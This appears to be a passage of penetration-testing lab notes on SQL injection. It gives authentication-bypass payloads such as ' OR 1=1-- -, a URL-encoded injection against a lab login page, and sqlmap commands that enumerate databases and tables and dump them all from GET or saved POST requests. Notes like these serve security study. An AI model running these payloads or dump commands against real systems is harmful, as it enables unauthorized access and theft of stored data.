
 If the attacker enters ' OR 1=1-- - in the name parameter and leaves the password blank, the query above will result in the following SQL statement.
```bash
SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = ''
```
If the database executes the SQL statement above, all the users in the users table are returned. Consequently, the attacker bypasses the application's authentication mechanism and is logged in as the first user returned by the query.

Or bypass the login with both fields `1 or 1=1-- -` will results in the below query. If this doesn't work try converting the query int's to strings via `1' or '1'='1'-- -`
```bash
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=1 or 1=1-- - AND password = 'abba6cc0495da8c6efde88
```

### URL Injection
The login and the client-side validation can then easily be bypassed by going directly to this URL:
```bash
http://$IP:5000/sesqli3/login?profileID=-1' or 1=1-- -&password=a
```

The browser will automatically urlencode this for us. Urlencoding is needed since the HTTP protocol does not support all characters in the request. When urlencoded, the URL looks as follows:
```bash
http://$IP:5000/sesqli3/login?profileID=-1%27%20or%201=1--%20-&password=a
```

The %27 becomes the single quote (') character and %20 becomes a blank space.

Can also bypass the client side sanitization capturing request with burp and then using some of the above SQL injection methods

## sqlmap

For the help menu `sqlmap -h` or for advanced help `sqlmap --h`

**Simple HTTP GET based test**
```bash
sqlmap -u https://testsite.com/page.php?id=7 --dbs
```
Here we have used two flags: -u to state the vulnerable URL and --dbs to enumerate the database.

**Simple HTTP POST Based Test**
Using burp first, we need to identify the vulnerable POST request and save it. In order to save the request, Right Click on the request, select 'Copy to file', and save it to a directory. You could also copy the whole request and save it to a text file as well.

To find the vulnerable parameter look in the saved file. This example the parameter would be "title"

```html
POST /sqli_6.php HTTP/1.1
Host: 192.243.226.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.243.226.3/sqli_6.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Connection: close
Cookie: PHPSESSID=qht4le51fs4sgvp9bu774psa33; security_level=0
Upgrade-Insecure-Requests: 1

title=jazzercise&action=search
```

Then run the command with the saved file:
```bash
sqlmap -r <request_file> -p <vulnerable_parameter> --dbs
```

Now that we have the databases, let's extract tables from the database.

**Using GET based Method**
  ```bash
sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables
```

**Using POST based Method**
```bash
sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables
```

Once we run these commands, we should get the tables.

Or we can simply dump all the available databases and tables using the following commands.  

**Using GET based Method**
```bash
sqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all
```

**Using POST based Method**

```bash
sqlmap -r req.txt -D <database_name> --dump-all
```

